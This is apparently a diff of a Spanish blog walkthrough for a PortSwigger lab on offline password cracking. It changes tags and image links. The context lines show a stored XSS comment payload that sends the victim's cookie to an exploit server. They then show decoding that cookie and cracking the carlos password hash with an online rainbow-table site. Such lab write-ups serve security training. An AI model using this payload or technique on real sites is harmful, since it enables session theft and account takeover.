@@ -7,13 +7,9 @@ categories:
   - Authentication
 tags:
   - Authentication
-  - Username
-  - enumeration
-  - via
-  - different
-  - responses
+  - Offline password cracking
 image:
-  path: /assets/img/Authentication-Lab-1/Portswigger.png
+  path: /assets/img/Authentication-Lab-10/Portswigger.png
 ---
 
 ## Skills
@@ -36,23 +32,23 @@ Este `laboratorio` almacena el `hash de la contraseña` del usuario en una `cook
 
 Al `acceder` a la `web` nos sale esto
 
-![[image_1.png]]
+![](/assets/img/Authentication-Lab-10/image_1.png)
 
 Pulsamos sobre `My account`, nos `logueamos` usando las credenciales `wiener:peter` y marcamos la casilla de `Stay logged in`
 
-![[image_2.png]]
+![](/assets/img/Authentication-Lab-10/image_2.png)
 
 Pulsamos en `View post` y vemos que hay una `sección` de `comentarios`
 
-![[image_3.png]]
+![](/assets/img/Authentication-Lab-10/image_3.png)
 
 Vemos que hemos podido `inyectar código HTML`
 
-![[image_4.png]]
+![](/assets/img/Authentication-Lab-10/image_4.png)
 
 Si vemos el `código fuente` nos damos cuenta que el código insertado en la `sección` de `comentarios` no se está `HTML encodeando` 
 
-![[image_5.png]]
+![](/assets/img/Authentication-Lab-10/image_5.png)
 
 Nos dirigimos al `Exploit server` y copiamos la url `https://exploit-0a6800e703d4999e8022985501aa002c.exploit-server.net/exploit`, posteriormente vamos a publicar un comentario para `explotar` un `stored XSS` y así `obtener` la `cookie` del `usuario víctima`
 
@@ -60,11 +56,11 @@ Nos dirigimos al `Exploit server` y copiamos la url `https://exploit-0a6800e703d
 <script>document.location='https://exploit-0a6800e703d4999e8022985501aa002c.exploit-server.net/exploit/'+document.cookie</script>
 ```
 
-![[image_6.png]]
+![](/assets/img/Authentication-Lab-10/image_6.png)
 
 Una vez publicado nos dirigimos al `Exploit server` y abrimos el apartado de `logs` y vemos este `log`
 
-![[image_7.png]]
+![](/assets/img/Authentication-Lab-10/image_7.png)
 
 Si `decodeamos` este `parámetro` de la cookie `Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz` obtener el `nombre` de `usuario` y la `contraseña` del usuario `hasheada`
 
@@ -75,16 +71,16 @@ carlos:26323c16d5f4dabff3bb136f2460a943
 
 Además de `crackear` la `contraseña` con `john` o `hashcat` podemos usar `rainbow tables` para `obtener` la `contraseña`, existen varias web que podemos usar como [https://crackstation.net/](https://crackstation.net/)
 
-![[image_8.png]]
+![](/assets/img/Authentication-Lab-10/image_8.png)
 
 También podríamos `pegar` el `hash` en el `navegador` y `obtener` el `contenido` del `hash` de esta forma
 
-![[image_9.png]]
+![](/assets/img/Authentication-Lab-10/image_9.png)
 
 Una vez tenemos el `usuario` y la `contraseña` ya podemos acceder `iniciar sesión` con las credenciales `carlos:onceuponatime` y `borrar` al `usuario carlos`
 
-![[image_10.png]]
+![](/assets/img/Authentication-Lab-10/image_10.png)
 
-![[image_11.png]]
+![](/assets/img/Authentication-Lab-10/image_11.png)
 
-![[image_12.png]]
+![](/assets/img/Authentication-Lab-10/image_12.png)
